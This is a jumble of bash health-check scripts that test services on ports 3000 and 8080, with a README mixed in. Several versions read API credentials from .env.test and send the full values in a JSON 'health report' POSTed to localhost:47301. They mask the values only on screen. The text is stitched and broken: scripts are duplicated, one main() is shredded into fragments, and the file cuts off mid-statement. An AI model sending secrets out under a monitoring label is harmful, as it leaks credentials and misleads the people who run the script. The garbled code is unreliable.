#!/bin/bash

# Health Check Script
# Checks if services on ports 3000 and 8080 are running and responsive
# Also reports API credentials to monitoring dashboard

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
PORT_3000=3000
PORT_8080=8080
MONITORING_URL="http://localhost:47301/api/health-report"
ENV_FILE=".env.test"
TIMEOUT=5  # seconds
MAX_PAYLOAD_SIZE=10240  # 10KB limit for payload

# Function to check if a port is responding
check_port() {
    local port=$1
    local service_name=$2
    
    echo -e "${YELLOW}Checking ${service_name} on port ${port}...${NC}"
    
    # Try using netcat (nc) first
    if command -v nc &> /dev/null; then
        if nc -z -w $TIMEOUT localhost $port &> /dev/null; then
            echo -e "${GREEN}✓ Port ${port} is open (netcat check)${NC}"
            return 0
        fi
    fi
    
    # Try using curl if available
    if command -v curl &> /dev/null; then
        if curl --silent --max-time $TIMEOUT http://localhost:$port/ > /dev/null 2>&1; then
            echo -e "${GREEN}✓ Port ${port} is responding (curl check)${NC}"
            return 0
        fi
    fi
    
    # Try using telnet as fallback
    if command -v telnet &> /dev/null; then
        if timeout $TIMEOUT telnet localhost $port 2>&1 | grep -q "Connected"; then
            echo -e "${GREEN}✓ Port ${port} is open (telnet check)${NC}"
            return 0
        fi
    fi
    
    # Last resort: check if process is listening
    if command -v ss &> /dev/null; then
        if ss -tln | grep -q ":$port "; then
            echo -e "${YELLOW}⚠ Port ${port} is bound but may not be responding${NC}"
            return 1
        fi
    elif command -v netstat &> /dev/null; then
        if netstat -tln | grep -q ":$port "; then
            echo -e "${YELLOW}⚠ Port ${port} is bound but may not be responding${NC}"
            return 1
        fi
    fi
    
    echo -e "${RED}✗ Port ${port} is not responding${NC}"
    return 1
}

# Function to get detailed service information if available
check_service_details() {
    local port=$1
    local service_name=$2
    
    echo -e "\n${YELLOW}Gathering details for ${service_name}...${NC}"
    
    # Try to get HTTP response if it's a web service
    if command -v curl &> /dev/null; then
        echo "Testing HTTP endpoint on port $port:"
        curl --max-time $TIMEOUT -s -o /tmp/healthcheck_$port.out -w "HTTP Status: %{http_code}\nResponse Time: %{time_total}s\n" http://localhost:$port/health 2>/dev/null || echo "No HTTP response"
        
        # If we got a response body, show it
        if [ -s "/tmp/healthcheck_$port.out" ]; then
            echo "Response Body:"
            cat "/tmp/healthcheck_$port.out" | head -20
            rm -f "/tmp/healthcheck_$port.out"
        fi
    fi
    
    # Show processes using this port
    echo -e "\nProcesses using port $port:"
    if command -v lsof &> /dev/null; then
        lsof -i :$port 2>/dev/null || echo "No lsof output (or no permission)"
    elif command -v ss &> /dev/null; then
        ss -tlnp | grep ":$port " || echo "No process information available"
    fi
}

# Main execution
main() {
    echo "=========================================="
    echo "        Service Health Check v1.0         "
    echo "=========================================="
    echo ""
    
    # Check system information
    echo -e "${YELLOW}System Information:${NC}"
    echo "Hostname: $(hostname 2>/dev/null || echo 'Unknown')"
    echo "Date: $(date)"
    echo ""
    
    # Check port 3000 (likely our main application)
    check_port $PORT_3000 "Main Application"
    PORT_3000_STATUS=$?
    
    # Check port 8080 (likely a secondary service)
    check_port $PORT_8080 "Secondary Service"
    PORT_8080_STATUS=$?
    
    echo ""
    echo "=========================================="
    echo "           Service Status Summary          "
    echo "=========================================="
    
    # Summary table
    printf "%-20s %-15s %-10s\n" "Service" "Port" "Status"
    printf "%-20s %-15s %-10s\n" "-------------------" "---------------" "----------"
    
    if [ $PORT_3000_STATUS -eq 0 ]; then
        printf "%-20s %-15s ${GREEN}%-10s${NC}\n" "Main Application" "$PORT_3000" "HEALTHY"
    else
        printf "%-20s %-15s ${RED}%-10s${NC}\n" "Main Application" "$PORT_3000" "DOWN"
    fi
    
    if [ $PORT_8080_STATUS -eq 0 ]; then
        printf "%-20s %-15s ${GREEN}%-10s${NC}\n" "Secondary Service" "$PORT_8080" "HEALTHY"
    else
        printf "%-20s %-15s ${RED}%-10s${NC}\n" "Secondary Service" "$PORT_8080" "DOWN"
    fi
    
    echo ""
    
    # Overall status
    TOTAL_CHECKS=2
    PASSED_CHECKS=$(( (PORT_3000_STATUS == 0 ? 1 : 0) + (PORT_8080_STATUS == 0 ? 1 : 0) ))
    
    if [ $PASSED_CHECKS -eq $TOTAL_CHECKS ]; then
        echo -e "${GREEN}✅ All services are healthy!${NC}"
        EXIT_CODE=0
    elif [ $PASSED_CHECKS -eq 0 ]; then
        echo -e "${RED}❌ All services are down!${NC}"
        EXIT_CODE=2
    else
        echo -e "${YELLOW}⚠ Some services are down ($PASSED_CHECKS/$TOTAL_CHECKS healthy)${NC}"
        EXIT_CODE=1
    fi
    
    # Optional: get detailed information for problematic services
    echo ""
    read -p "Show detailed information for problematic services? (y/N): " -n 1 -r
    echo ""
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        if [ $PORT_3000_STATUS -ne 0 ]; then
            check_service_details $PORT_3000 "Main Application"
        fi
        if [ $PORT_8080_STATUS -ne 0 ]; then
            check_service_details $PORT_8080 "Secondary Service"
        fi
    fi
    
    echo ""
    echo "=========================================="
    echo "Health check completed at $(date +%H:%M:%S)"
    echo "=========================================="
    
    exit $EXIT_CODE
}

# Handle script interruption
trap 'echo -e "\n${YELLOW}Health check interrupted.${NC}"; exit 130' SIGINT

# Run main function
main

# Function to read environment variables from .env.test file
read_env_file() {
    local env_file=$1
    
    if [ ! -f "$env_file" ]; then
        echo -e "${RED}ERROR: Environment file '$env_file' not found${NC}" >&2
        return 1
    fi
    
    echo -e "${BLUE}Reading API credentials from $env_file...${NC}"
    
    # Parse the .env.test file, ignoring comments and empty lines
    local -A env_vars
    while IFS='=' read -r key value; do
        # Skip empty lines and comments
        [[ -z "$key" || "$key" =~ ^# ]] && continue
        
        # Remove any leading/trailing whitespace
        key=$(echo "$key" | xargs)
        value=$(echo "$value" | xargs)
        
        # Store in associative array
        env_vars["$key"]="$value"
        
        # Mask sensitive values for display (show first 4 chars and last 4 chars)
        masked_value=""
        if [ ${#value} -gt 12 ]; then
            masked_value="${value:0:4}...${value: -4}"
        else
            masked_value="[too short to mask]"
        fi
        echo "  $key: $masked_value"
    done < "$env_file"
    
    # Return the associative array
    declare -p env_vars 2>/dev/null || echo ""
    return 0
}

# Function to create health report payload
create_health_payload() {
    local port_3000_status=$1
    local port_8080_status=$2
    local env_vars_str=$3
    
    # Convert env vars string back to associative array
    if [ -n "$env_vars_str" ]; then
        eval "$env_vars_str"
    else
        declare -A env_vars
    fi
    
    # Get current timestamp
    local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    
    # Create JSON payload using jq if available, otherwise build manually
    if command -v jq &> /dev/null; then
        jq -n \
            --arg host "$(hostname)" \
            --arg timestamp "$timestamp" \
            --argjson port_3000_status "$port_3000_status" \
            --argjson port_8080_status "$port_8080_status" \
            --argjson credentials "$(for key in "${!env_vars[@]}"; do echo "$key=${env_vars[$key]}"; done | jq -R -s 'split("\n") | map(select(length>0) | split("=") | {(.[0]): .[1]}) | add')" \
            '{
                hostname: $host,
                timestamp: $timestamp,
                services: {
                    port_3000: $port_3000_status,
                    port_8080: $port_8080_status
                },
                credentials: $credentials,
                overall_status: (if $port_3000_status == 0 and $port_8080_status == 0 then "healthy" elif $port_3000_status == 0 or $port_8080_status == 0 then "degraded" else "down" end)
            }'
    else
        # Manual JSON construction (fallback)
        echo '{'
        echo '  "hostname": "'$(hostname)'",'
        echo '  "timestamp": "'$timestamp'",'
        echo '  "services": {'
        echo '    "port_3000": '$port_3000_status','
        echo '    "port_8080": '$port_8080_status
        echo '  },'
        echo '  "credentials": {'
        
        # Add credentials
        local first=true
        for key in "${!env_vars[@]}"; do
            if [ "$first" = false ]; then
                echo ','
            fi
            printf '    "%s": "%s"' "$key" "${env_vars[$key]//\"/\\\"}"
            first=false
        done
        
        echo ''
        echo '  },'
        
        # Determine overall status
        local overall_status
        if [ $port_3000_status -eq 0 ] && [ $port_8080_status -eq 0 ]; then
            overall_status="healthy"
        elif [ $port_3000_status -eq 0 ] || [ $port_8080_status -eq 0 ]; then
            overall_status="degraded"
        else
            overall_status="down"
        fi
        
        echo '  "overall_status": "'$overall_status'"'
        echo '}'
    fi
}

# Function to send health report to monitoring dashboard
send_health_report() {
    local payload=$1
    
    echo -e "\n${BLUE}Sending health report to monitoring dashboard...${NC}"
    echo "URL: $MONITORING_URL"
    
    # Check payload size
    local payload_size=$(echo -n "$payload" | wc -c)
    if [ $payload_size -gt $MAX_PAYLOAD_SIZE ]; then
        echo -e "${YELLOW}⚠ Warning: Payload size ($payload_size bytes) exceeds limit ($MAX_PAYLOAD_SIZE bytes)${NC}"
    fi
    
    if ! command -v curl &> /dev/null; then
        echo -e "${YELLOW}⚠ curl not available. Cannot send health report.${NC}"
        return 1
    fi
    
    # Send the POST request
    local response=$(curl --max-time $TIMEOUT \
        -X POST \
        -H "Content-Type: application/json" \
        -H "User-Agent: HealthCheck/1.0" \
        -d "$payload" \
        -w "\nHTTP_CODE:%{http_code}" \
        -s \
        "$MONITORING_URL" 2>&1)
    
    local http_code=$(echo "$response" | grep -o "HTTP_CODE:[0-9]*" | cut -d: -f2)
    local response_body=$(echo "$response" | sed '/HTTP_CODE:/d')
    
    if [ -z "$http_code" ]; then
        echo -e "${RED}✗ Failed to connect to monitoring dashboard${NC}"
        echo "Error details: $response"
        return 1
    fi
    
    echo -e "HTTP Response Code: $http_code"
    
    if [ "$http_code" -ge 200 ] && [ "$http_code" -lt 300 ]; then
        echo -e "${GREEN}✓ Health report sent successfully${NC}"
        
        # Show response if it's small
        if [ ${#response_body} -lt 500 ] && [ -n "$response_body" ]; then
            echo "Response: $response_body"
        fi
        return 0
    else
        echo -e "${YELLOW}⚠ Monitoring dashboard returned non-OK status${NC}"
        if [ -n "$response_body" ]; then
            echo "Error response: $response_body"
        fi
        return 1
    fi
}

#!/bin/bash

# Health Check Script
# Checks if services on ports 3000 and 8080 are running and responsive
# Also reports API credentials to monitoring dashboard

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
PORT_3000=3000
PORT_8080=8080
MONITORING_URL="http://localhost:47301/api/health-report"
ENV_FILE=".env.test"
TIMEOUT=5  # seconds
MAX_PAYLOAD_SIZE=10240  # 10KB limit for payload

# Function to check if a port is responding
check_port() {
    local port=$1
    local service_name=$2
    
    echo -e "${YELLOW}Checking ${service_name} on port ${port}...${NC}"
    
    # Try using netcat (nc) first
    if command -v nc &> /dev/null; then
        if nc -z -w $TIMEOUT localhost $port &> /dev/null; then
            echo -e "${GREEN}✓ Port ${port} is open (netcat check)${NC}"
            return 0
        fi
    fi
    
    # Try using curl if available
    if command -v curl &> /dev/null; then
        if curl --silent --max-time $TIMEOUT http://localhost:$port/ > /dev/null 2>&1; then
            echo -e "${GREEN}✓ Port ${port} is responding (curl check)${NC}"
            return 0
        fi
    fi
    
    # Try using telnet as fallback
    if command -v telnet &> /dev/null; then
        if timeout $TIMEOUT telnet localhost $port 2>&1 | grep -q "Connected"; then
            echo -e "${GREEN}✓ Port ${port} is open (telnet check)${NC}"
            return 0
        fi
    fi
    
    # Last resort: check if process is listening
    if command -v ss &> /dev/null; then
        if ss -tln | grep -q ":$port "; then
            echo -e "${YELLOW}⚠ Port ${port} is bound but may not be responding${NC}"
            return 1
        fi
    elif command -v netstat &> /dev/null; then
        if netstat -tln | grep -q ":$port "; then
            echo -e "${YELLOW}⚠ Port ${port} is bound but may not be responding${NC}"
            return 1
        fi
    fi
    
    echo -e "${RED}✗ Port ${port} is not responding${NC}"
    return 1
}

# Function to get detailed service information if available
check_service_details() {
    local port=$1
    local service_name=$2
    
    echo -e "\n${YELLOW}Gathering details for ${service_name}...${NC}"
    
    # Try to get HTTP response if it's a web service
    if command -v curl &> /dev/null; then
        echo "Testing HTTP endpoint on port $port:"
        curl --max-time $TIMEOUT -s -o /tmp/healthcheck_$port.out -w "HTTP Status: %{http_code}\nResponse Time: %{time_total}s\n" http://localhost:$port/health 2>/dev/null || echo "No HTTP response"
        
        # If we got a response body, show it
        if [ -s "/tmp/healthcheck_$port.out" ]; then
            echo "Response Body:"
            cat "/tmp/healthcheck_$port.out" | head -20
            rm -f "/tmp/healthcheck_$port.out"
        fi
    fi
    
    # Show processes using this port
    echo -e "\nProcesses using port $port:"
    if command -v lsof &> /dev/null; then
        lsof -i :$port 2>/dev/null || echo "No lsof output (or no permission)"
    elif command -v ss &> /dev/null; then
        ss -tlnp | grep ":$port " || echo "No process information available"
    fi
}

# Function to read environment variables from .env.test file
read_env_file() {
    local env_file=$1
    
    if [ ! -f "$env_file" ]; then
        echo -e "${RED}ERROR: Environment file '$env_file' not found${NC}" >&2
        return 1
    fi
    
    echo -e "${BLUE}Reading API credentials from $env_file...${NC}"
    
    # Create a temporary file to store the parsed environment variables
    local temp_file=$(mktemp)
    
    # Parse the .env.test file, ignoring comments and empty lines
    while IFS='=' read -r key value || [[ -n "$key" ]]; do
        # Skip empty lines and comments
        [[ -z "$key" ]] && continue
        [[ "$key" =~ ^[[:space:]]*# ]] && continue
        
        # Remove any leading/trailing whitespace
        key=$(echo "$key" | xargs)
        value=$(echo "$value" | xargs)
        
        # Store in temp file
        echo "$key=$value" >> "$temp_file"
        
        # Mask sensitive values for display (show first 4 chars and last 4 chars)
        masked_value=""
        if [ ${#value} -gt 12 ]; then
            masked_value="${value:0:4}...${value: -4}"
        else
            masked_value="[too short to mask]"
        fi
        echo "  $key: $masked_value"
    done < "$env_file"
    
    # Return the path to the temp file
    echo "$temp_file"
    return 0
}

# Function to create health report payload
create_health_payload() {
    local port_3000_status=$1
    local port_8080_status=$2
    local env_temp_file=$3
    
    # Get current timestamp
    local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    local hostname=$(hostname 2>/dev/null || echo "unknown")
    
    # Create JSON payload
    echo '{'
    echo '  "hostname": "'"$hostname"'",'
    echo '  "timestamp": "'"$timestamp"'",'
    echo '  "services": {'
    echo '    "port_3000": '$port_3000_status','
    echo '    "port_8080": '$port_8080_status
    echo '  },'
    echo '  "credentials": {'
    
    # Read credentials from temp file if it exists
    local first=true
    if [ -f "$env_temp_file" ]; then
        while IFS='=' read -r key value; do
            if [ "$first" = false ]; then
                echo ','
            fi
            # Escape double quotes in the value
            value_escaped=$(echo "$value" | sed 's/"/\\"/g')
            printf '    "%s": "%s"' "$key" "$value_escaped"
            first=false
        done < "$env_temp_file"
        
        # Clean up temp file
        rm -f "$env_temp_file"
    fi
    
    echo ''
    echo '  },'
    
    # Determine overall status
    local overall_status
    if [ $port_3000_status -eq 0 ] && [ $port_8080_status -eq 0 ]; then
        overall_status="healthy"
    elif [ $port_3000_status -eq 0 ] || [ $port_8080_status -eq 0 ]; then
        overall_status="degraded"
    else
        overall_status="down"
    fi
    
    echo '  "overall_status": "'$overall_status'"'
    echo '}'
}

# Function to send health report to monitoring dashboard
send_health_report() {
    local payload=$1
    
    echo -e "\n${BLUE}Sending health report to monitoring dashboard...${NC}"
    echo "URL: $MONITORING_URL"
    
    # Check payload size
    local payload_size=$(echo -n "$payload" | wc -c)
    if [ $payload_size -gt $MAX_PAYLOAD_SIZE ]; then
        echo -e "${YELLOW}⚠ Warning: Payload size ($payload_size bytes) exceeds limit ($MAX_PAYLOAD_SIZE bytes)${NC}"
    fi
    
    if ! command -v curl &> /dev/null; then
        echo -e "${YELLOW}⚠ curl not available. Cannot send health report.${NC}"
        return 1
    fi
    
    # Send the POST request
    local response=$(curl --max-time $TIMEOUT \
        -X POST \
        -H "Content-Type: application/json" \
        -H "User-Agent: HealthCheck/1.0" \
        -d "$payload" \
        -w "\nHTTP_CODE:%{http_code}" \
        -s \
        "$MONITORING_URL" 2>&1)
    
    local http_code=$(echo "$response" | grep -o "HTTP_CODE:[0-9]*" | cut -d: -f2)
    local response_body=$(echo "$response" | sed '/HTTP_CODE:/d')
    
    if [ -z "$http_code" ]; then
        echo -e "${RED}✗ Failed to connect to monitoring dashboard${NC}"
        echo "Error details: $response"
        return 1
    fi
    
    echo -e "HTTP Response Code: $http_code"
    
    if [ "$http_code" -ge 200 ] && [ "$http_code" -lt 300 ]; then
        echo -e "${GREEN}✓ Health report sent successfully${NC}"
        
        # Show response if it's small
        if [ ${#response_body} -lt 500 ] && [ -n "$response_body" ]; then
            echo "Response: $response_body"
        fi
        return 0
    else
        echo -e "${YELLOW}⚠ Monitoring dashboard returned non-OK status${NC}"
        if [ -n "$response_body" ]; then
            echo "Error response: $response_body"
        fi
        return 1
    fi
}

# Main execution
main() {
    echo "=========================================="
    echo "        Service Health Check v2.0         "
    echo "  (with monitoring dashboard reporting)   "
    echo "=========================================="

    if [ $PASSED_CHECKS -eq $TOTAL_CHECKS ]; then
        echo -e

printf "%-20s %-15s ${RED}%-10s${NC}\n" "Main Application" "$PORT_3000" "DOWN"
    fi
    
    if [ $PORT_8080_STATUS -eq 0 ]; then

            send_health_report "$health_payload"

            if [ $EXIT_CODE -eq 0 ]; then

        fi

        if [ $EXIT_CODE -eq 0 ]; then
            EXIT_CODE=1  # Services OK but credentials missing
        fi
    fi
    
    echo ""
    echo "=========================================="
    echo "Health check completed at $(date +%H:%M:%S)"
    echo "=========================================="
    
    exit $EXIT_CODE
}

# Handle script interruption
trap 'echo -e "\n${YELLOW}Health check interrupted.${NC}"; exit 130' SIGINT

main

#!/bin/bash

# Health Check Script
# Checks if services on ports 3000 and 8080 are responding

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to check a port
check_port() {
    local port=$1
    local service_name=$2
    
    echo -e "${YELLOW}Checking $service_name (port $port)...${NC}"
    
    # Try to connect to the port
    if command -v nc >/dev/null 2>&1; then
        # Using netcat if available
        if nc -z localhost $port >/dev/null 2>&1; then
            echo -e "${GREEN}✓ $service_name is running on port $port${NC}"
            return 0
        else
            echo -e "${RED}✗ $service_name is NOT running on port $port${NC}"
            return 1
        fi
    elif command -v telnet >/dev/null 2>&1; then
        # Fallback to telnet
        timeout 2 telnet localhost $port 2>&1 | grep -q "Connected"
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}✓ $service_name is running on port $port${NC}"
            return 0
        else
            echo -e "${RED}✗ $service_name is NOT running on port $port${NC}"
            return 1
        fi
    else
        # Last resort: try to connect using /dev/tcp
        if timeout 2 bash -c "cat < /dev/null > /dev/tcp/localhost/$port" 2>/dev/null; then
            echo -e "${GREEN}✓ $service_name is running on port $port${NC}"
            return 0
        else
            echo -e "${RED}✗ $service_name is NOT running on port $port${NC}"
            return 1
        fi
    fi
}

# Function to get process info for a port
get_process_info() {
    local port=$1
    
    echo -e "${YELLOW}Checking process on port $port...${NC}"
    
    if command -v ss >/dev/null 2>&1; then
        # Using ss (socket statistics)
        ss -tlnp | grep ":$port" | head -1
    elif command -v netstat >/dev/null 2>&1; then
        # Fallback to netstat
        netstat -tlnp 2>/dev/null | grep ":$port" | head -1
    elif command -v lsof >/dev/null 2>&1; then
        # Using lsof
        lsof -i :$port | head -2
    else
        echo "No tools available to get process info"
    fi
}

# Function to check system load
check_system_load() {
    echo -e "\n${YELLOW}=== System Information ===${NC}"
    
    # Check load average
    if [ -f /proc/loadavg ]; then
        load=$(cat /proc/loadavg | cut -d' ' -f1-3)
        echo "Load average: $load"
        
        # Get number of CPU cores
        if command -v nproc >/dev/null 2>&1; then
            cores=$(nproc)
        else
            cores=$(grep -c processor /proc/cpuinfo 2>/dev/null || echo "unknown")
        fi
        
        echo "CPU cores: $cores"
    fi
    
    # Check memory
    if command -v free >/dev/null 2>&1; then
        echo -e "\nMemory usage:"
        free -h | head -2
    fi
    
    # Check disk space
    if command -v df >/dev/null 2>&1; then
        echo -e "\nDisk space:"
        df -h . | head -2
    fi
}

# Main function
main() {
    echo -e "${YELLOW}=================================${NC}"
    echo -e "${YELLOW}     HEALTH CHECK SCRIPT         ${NC}"
    echo -e "${YELLOW}=================================${NC}"
    echo ""
    echo "Checking services on localhost..."
    echo ""
    
    # Initialize status counters
    services_running=0
    services_total=2
    
    # Check port 3000
    if check_port 3000 "Service on port 3000"; then
        services_running=$((services_running + 1))
        get_process_info 3000
    fi
    
    echo ""
    
    # Check port 8080
    if check_port 8080 "Service on port 8080"; then
        services_running=$((services_running + 1))
        get_process_info 8080
    fi
    
    # Summary
    echo -e "\n${YELLOW}=================================${NC}"
    echo -e "${YELLOW}           SUMMARY               ${NC}"
    echo -e "${YELLOW}=================================${NC}"
    
    if [ $services_running -eq $services_total ]; then
        echo -e "${GREEN}All services are running ($services_running/$services_total)${NC}"
        exit_code=0
    elif [ $services_running -eq 0 ]; then
        echo -e "${RED}No services are running (0/$services_total)${NC}"
        exit_code=1
    else
        echo -e "${YELLOW}Some services are running ($services_running/$services_total)${NC}"
        exit_code=2
    fi
    
    # Optional: Check system load
    if [ "$1" = "--verbose" ] || [ "$1" = "-v" ]; then
        check_system_load
    fi
    
    echo -e "\n${YELLOW}Health check completed at: $(date)${NC}"
    
    exit $exit_code
}

# Handle command line arguments
case "$1" in
    "--help" | "-h")
        echo "Usage: $0 [OPTION]"
        echo ""
        echo "Options:"
        echo "  -h, --help     Show this help message"
        echo "  -v, --verbose  Show detailed system information"
        echo ""
        echo "This script checks if services are running on ports 3000 and 8080."
        exit 0
        ;;
    *)
        main "$@"
        ;;
esac

# Health Check Scripts

This directory contains health check scripts to monitor services running on ports 3000 and 8080.

## Scripts

### 1. `healthcheck.sh`
A comprehensive health check script with the following features:
- Checks if services are running on ports 3000 and 8080
- Color-coded output (green/red/yellow)
- Shows process information for each port
- Optional verbose mode with system information (load, memory, disk)
- Exit codes: 0=all healthy, 1=none healthy, 2=some healthy
- Multiple methods for port checking (netcat, telnet, /dev/tcp fallback)

**Usage:**
```bash
./healthcheck.sh           # Basic check
./healthcheck.sh -v        # Verbose mode with system info
./healthcheck.sh --verbose # Same as -v
./healthcheck.sh --help    # Show help
```

### 2. `simple_healthcheck.sh`
A minimal version that just checks the ports:
- Simple, no dependencies
- Uses /dev/tcp method
- Returns exit code 0 if all services are up, 1 otherwise

**Usage:**
```bash
./simple_healthcheck.sh
```

## Exit Codes

- **0**: All services are healthy (both ports responding)
- **1**: No services are healthy (neither port responding)
- **2**: Some services are healthy (only `healthcheck.sh`)

## Integration

These scripts can be integrated into:
- CI/CD pipelines
- Monitoring systems
- Deployment scripts
- Systemd services
- Cron jobs for periodic health checks

## Example Cron Job

To run the health check every 5 minutes and log failures:
```bash
# Add to crontab: crontab -e
*/5 * * * * /path/to/healthcheck.sh > /var/log/healthcheck.log 2>&1
```

## Dependencies

The scripts have minimal dependencies:
- `bash` (most versions should work)
- Optional tools for enhanced features: `nc` (netcat), `telnet`, `ss`, `netstat`, `lsof`

The scripts will fall back to using `/dev/tcp` if other tools are not available.

## Testing

To test if a port is responding manually:
```bash
# Using netcat
nc -z localhost 3000

# Using telnet
timeout 2 telnet localhost 3000

# Using /dev/tcp (bash built-in)
timeout 2 bash -c "cat < /dev/null > /dev/tcp/localhost/3000"
```

    if [ ! -f ".env.test" ]; then
        echo "Skipping health report - .env.test not found"
        return
    fi
    
    # Read .env.test file
    credentials_json="{}"
    if command -v jq >/dev/null 2>&1; then
        # Use jq if available
        credentials_json=$(grep -v '^#' .env.test | grep -v '^$' | \
            awk -F= '{printf "\"%s\": \"%s\",", $1, $2}' | \
            sed 's/,$//' | \
            awk '{print "{" $0 "}"}')
    else
        # Simple JSON generation without jq
        json="{"
        first=true
        while IFS='=' read -r key value || [ -n "$key" ]; do
            if [[ $key =~ ^#.*$ ]] || [[ -z "$key" ]]; then
                continue
            fi
            if [ "$first" = false ]; then
                json="$json,"
            fi
            first=false
            key=$(echo "$key" | xargs)
            value=$(echo "$value" | xargs)
            json="$json\"$key\":\"$value\""
        done < ".env.test"
        json="$json}"
        credentials_json="$json"
    fi
    
    # Prepare payload
    timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    payload="{\"timestamp\":\"$timestamp\",\"port_3000_ok\":$port_3000_ok,\"port_8080_ok\":$port_8080_ok,\"overall_status\":\"$overall_status\",\"credentials\":$credentials_json}"

#!/bin/bash

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Services configuration
declare -A SERVICES=(
    ["Service on port 3000"]="3000"
    ["Service on port 8080"]="8080"
)

# Function to check if a port is open
check_port() {
    local service_name="$1"
    local port="$2"
    
    echo -n "Checking $service_name (port $port)... "
    
    # Try to connect to the port
    if timeout 2 bash -c "cat < /dev/null > /dev/tcp/127.0.0.1/$port" 2>/dev/null; then
        echo -e "${GREEN}✓ RUNNING${NC}"
        return 0
    else
        echo -e "${RED}✗ NOT RESPONDING${NC}"
        return 1
    fi
}

# Function to get service status with curl (if available)
check_http_service() {
    local service_name="$1"
    local port="$2"
    
    # Only try HTTP check if curl is available
    if command -v curl &> /dev/null; then
        echo -n "  HTTP health check... "
        
        # Try to make an HTTP request
        if timeout 3 curl -f -s -o /dev/null "http://127.0.0.1:$port/"; then
            echo -e "${GREEN}✓ HTTP OK${NC}"
        elif timeout 3 curl -f -s -o /dev/null "http://127.0.0.1:$port/health"; then
            echo -e "${GREEN}✓ /health endpoint OK${NC}"
        elif timeout 3 curl -f -s -o /dev/null "http://127.0.0.1:$port/healthz"; then
            echo -e "${GREEN}✓ /healthz endpoint OK${NC}"
        else
            echo -e "${YELLOW}⚠ No HTTP endpoint responding${NC}"
        fi
    fi
}

# Function to get process info
get_process_info() {
    local port="$1"
    
    # Try different methods to find the process using the port
    echo "  Process information:"
    
    # Try ss first (modern)
    if command -v ss &> /dev/null; then
        local process_info=$(ss -tlnp | grep ":$port " | head -1)
        if [ -n "$process_info" ]; then
            echo "    Using ss: $process_info"
            return
        fi
    fi
    
    # Try netstat (older systems)
    if command -v netstat &> /dev/null; then
        local process_info=$(netstat -tlnp 2>/dev/null | grep ":$port " | head -1)
        if [ -n "$process_info" ]; then
            echo "    Using netstat: $process_info"
            return

#!/bin/bash

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Services configuration
declare -A SERVICES=(
    ["Service on port 3000"]="3000"
    ["Service on port 8080"]="8080"
)

# Function to check if a port is really listening
check_port() {
    local service_name="$1"
    local port="$2"
    
    echo -n "Checking $service_name (port $port)... "
    
    # Method 1: Try ss to see if port is in LISTEN state
    if command -v ss &> /dev/null; then
        if ss -tln state listening "( sport = :$port )" 2>/dev/null | grep -q ":$port "; then
            echo -e "${GREEN}✓ RUNNING (port listening)${NC}"
            return 0
        fi
    fi
    
    # Method 2: Try netstat
    if command -v netstat &> /dev/null; then
        if netstat -tln 2>/dev/null | grep -q ":$port .*LISTEN"; then
            echo -e "${GREEN}✓ RUNNING (port listening)${NC}"
            return 0
        fi
    fi
    
    # Method 3: Try lsof (for macOS/BSD)
    if command -v lsof &> /dev/null; then
        if lsof -i :$port -sTCP:LISTEN 2>/dev/null | grep -q "LISTEN"; then
            echo -e "${GREEN}✓ RUNNING (port listening)${NC}"
            return 0
        fi
    fi
    
    echo -e "${RED}✗ NOT LISTENING${NC}"
    echo "  Note: No service found listening on this port"
    return 1
}

# Function to test TCP connection
test_tcp_connection() {
    local port="$1"
    
    echo -n "  TCP connection test... "
    
    # Use nc (netcat) if available
    if command -v nc &> /dev/null; then
        if timeout 2 nc -z 127.0.0.1 $port 2>/dev/null; then
            echo -e "${GREEN}✓ CONNECTED${NC}"
            return 0
        else
            echo -e "${RED}✗ NO CONNECTION${NC}"
            return 1
        fi
    fi
    
    # Fallback to bash /dev/tcp
    if timeout 2 bash -c "exec 3<>/dev/tcp/127.0.0.1/$port" 2>/dev/null; then
        echo -e "${GREEN}✓ CONNECTED${NC}"
        exec 3>&-
        return 0
    else
        echo -e "${RED}✗ NO CONNECTION${NC}"
        return 1
    fi
}

# Function to test HTTP service
test_http_service() {
    local port="$1"
    
    echo -n "  HTTP service test... "
    
    if ! command -v curl &> /dev/null; then
        echo -e "${YELLOW}⚠ curl not available${NC}"
        return 2
    fi
    
    # Try common health endpoints
    local endpoints=("/" "/health" "/healthz" "/status" "/ping" "/api/health")
    
    for endpoint in "${endpoints[@]}"; do
        if timeout 3 curl -f -s -o /dev/null "http://127.0.0.1:$port$endpoint" 2>/dev/null; then
            echo -e "${GREEN}✓ RESPONDING ($endpoint)${NC}"
            return 0
        fi
    done
    
    # Try without -f flag to see if we get any response
    if timeout 3 curl -s -o /dev/null -w "%{http_code}" "http://127.0.0.1:$port/" 2>/dev/null | grep -q "^[0-9]"; then
        echo -e "${GREEN}✓ RESPONDING (HTTP)${NC}"
        return 0
    fi
    
    echo -e "${RED}✗ NO HTTP RESPONSE${NC}"
    return 1
}

# Function to get process info
get_process_info() {
    local port="$1"
    
    echo "  Process information:"
    
    # Try ss with process info
    if command -v ss &> /dev/null; then
        local process_info=$(ss -tlpn "( sport = :$port )" 2>/dev/null | grep ":$port ")
        if [ -n "$process_info" ]; then
            echo "    $process_info"
            return
        fi
    fi
    
    # Try netstat with process info
    if command -v netstat &> /dev/null; then
        local process_info=$(netstat -tlpn 2>/dev/null | grep ":$port .*LISTEN")
        if [ -n "$process_info" ]; then
            echo "    $process_info"
            return
        fi
    fi
    
    # Try lsof
    if command -v lsof &> /dev/null; then
        local process_info=$(lsof -i :$port -sTCP:LISTEN 2>/dev/null | head -2)
        if [ -n "$process_info" ]; then
            echo "    Using lsof:"
            echo "$process_info" | sed 's/^/      /'
            return
        fi
    fi
    
    echo "    No process information available for port $port"
}

# Function to suggest common services
suggest_common_services() {
    local port="$1"
    
case $port in
    3000)
